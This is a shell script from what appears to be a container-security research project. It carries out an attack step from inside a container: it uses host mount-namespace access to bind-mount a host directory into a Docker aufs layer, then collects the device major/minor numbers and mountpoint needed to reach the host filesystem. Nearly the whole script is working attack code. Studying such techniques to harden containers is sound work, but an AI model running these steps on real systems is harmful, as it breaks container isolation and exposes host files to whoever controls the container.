#!/bin/sh

#Attacking directory where attacker's scripts are
attack="/home/ubuntu/SecureWilly/Attacks/Nsenter/Mount_hosts_filesystem"

#Attacker's container is using nsenter to enter host's filesystem so from now on we will refer to attacker's container namespaces as host's namespaces - especially mount namespace and host's filesystem.

#Layers in container's filesystem
ls /var/lib/docker/aufs/diff | grep -v removing | grep -v init
#Choose one and create a dir there
#Which one? Check in container's root directory to see if doot dir appears. If not ru again this script, choosing another layer
echo "Please give layer's id:"
read layer

#If doot does not exist already in the attacked container's / dir, create new directory doot
if [ ! -d /var/lib/docker/aufs/diff/${layer}/doot ]; then
	mkdir /var/lib/docker/aufs/diff/${layer}/doot
fi

#In host's filesystem, if restricted_area does not already exist, create dir restricted_area
if [ ! -d ${attack}/restricted_area ]; then
	mkdir ${attack}/restricted_area
fi

#Create a file in host's restricted_area
touch ${attack}/restricted_area/HellloFromTheOtherSide

#Then mount a host directory to container's doot directory
mount -o bind ${attack}/restricted_area /var/lib/docker/aufs/diff/${layer}/doot

#Find mountpoint of restricted_area's filesystem and which filesystem is that - special device that needs to be created
df ${attack}/restricted_area | grep / > fs_of_restricted_area #We use grep / to omit first line with titles of columns
#Keep the filesystem/device
cut -d' ' -f1 fs_of_restricted_area > sdev_of_fs
sdev_fs=$(cat sdev_of_fs)
#ls -l to find the real device not the mapping that we got at /dev/disk/by-uuid
ls -l ${sdev_fs} > sdev_of_fs1
awk '{ print $NF }' sdev_of_fs1 > sdev_of_fs2
cut -d'/' -f3 sdev_of_fs2 > sdev_of_fs3
mv sdev_of_fs3 sdev_of_fs
#cut -d' ' -f13 fs_of_restricted_area > mntpoint_of_fs
#Keep the path where the targeting filesystem is mounted at
cut -d' ' -f8 fs_of_restricted_area > mntpoint_of_fs
mnt_of_fs=$(cat mntpoint_of_fs)
cat /proc/self/mountinfo > mountinfo
#Find the subdirectory of the filesystem that is mounted at mntpoint_of_fs
awk -v mnt="${mnt_of_fs}" '{if ($5==mnt) {print $3}}' mountinfo > mntinfo
#Find the major and minor number of the device that needs to be created
cut -d':' -f1 mntinfo > major_num
cut -d':' -f2 mntinfo > minor_num

#Clear files
rm fs_of_restricted_area
rm mountinfo
rm mntinfo
rm mntpoint_of_fs
